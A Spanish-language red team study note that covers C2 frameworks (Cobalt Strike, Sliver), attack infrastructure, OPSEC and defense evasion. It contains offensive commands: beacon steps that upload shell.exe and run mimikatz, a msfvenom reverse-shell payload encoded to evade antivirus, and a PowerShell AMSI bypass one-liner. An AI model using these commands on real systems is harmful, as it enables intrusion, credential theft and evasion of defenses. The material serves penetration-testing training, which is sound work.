# Red Team - Fase 6: Red Team Avanzado & OPSEC

## 1. Cobalt Strike

### 1.1 Concepto
Plataforma de Comando y Control (C2) para Red Team.

### 1.2 Setup

```bash
# Install
java -jar cobaltstrike.jar

# Listener
# Cobalt Strike → Listeners → Add
# HTTPS beacon
```

### 1.3 beacon

```bash
# Commands
beacon> help
beacon> shell ipconfig
beacon> cd C:\\Users\\victim
beacon> upload shell.exe
beacon> execute-assembly /tmp/mimikatz.exe
```

---

## 2. Sliver

### 2.1 Install

```bash
# Download
wget https://github.com/BishopFox/sliver/releases/latest

# Server
./sliver server

# Generate
generate --mtls victim:4444
```

### 2.2 implants

```linux
# Linux
generate --mtls 192.168.1.10 --os linux -f shell

# Windows
generate --mtls 192.168.1.10 --os windows -f shell

# Use implant
./implant
```

---

## 3. Infraestructura de Ataque

### 3.1 VPS Setup

```bash
# Create VPS
# Configurar firewall
ufw enable
ufw allow 22/tcp
ufw allow 443/tcp

# Hardening
sudo vim /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
```

### 3.2 Domain Fronting

```python
# Import: hacer tráfico pasar por dominio legítimo
# CloudFront, Azure, etc.
```

### 3.3 VPN

```bash
# Configurar VPN propia
# OpenVPN, WireGuard
```

---

## 4. OPSEC

### 4.1 Principios

| Principio | Descripción |
|----------|-------------|
| Mínimo ruido | Menos logs |
| Diversidad | Variar técnicas |
| Temporal | Timing apropiado |
| Precisión | Solo objetivo |

### 4.2 Evitar Detección

- Usar binarios legítimos
- Timing aleatorizado
- Mínimo tráfico de red
- Credenciales nativas

---

## 5. Evasión de Defensas

### 5.1 AV Bypass

```bash
# msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=443 -e x86/shikata_ga_nai -f exe -o shell.exe

# Veil
veil
use evasion
generate
```

### 5.2 AMSI Bypass

```powershell
# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 6. MITRE ATT&CK

### 6.1 Matriz

- T1059: Command and Scripting Interpreter
- T1053: Scheduled Task
- T1021: Remote Services
- T1083: File and Directory Discovery
- T1005: Data from Local System

### 6.2 Documentación

```markdown
# Ataque documentado según MITRE ATT&CK
- Initial Access: Phishing
- Execution: Malicious Link
- Persistence: Registry Run
- Defense Evasion: Obfuscated Files
```

---

## Resumen

| Componente | Herramienta |
|-----------|-------------|
| C2 | Cobalt Strike, Sliver |
| Infraestructura | VPS + Domain |
| OPSEC | Mínimo footprint |
| Evasión | AV/AMSI bypass |

---

## Recursos

- MITRE ATT&CK
- Cobalt Strike documentation
- Sliver documentation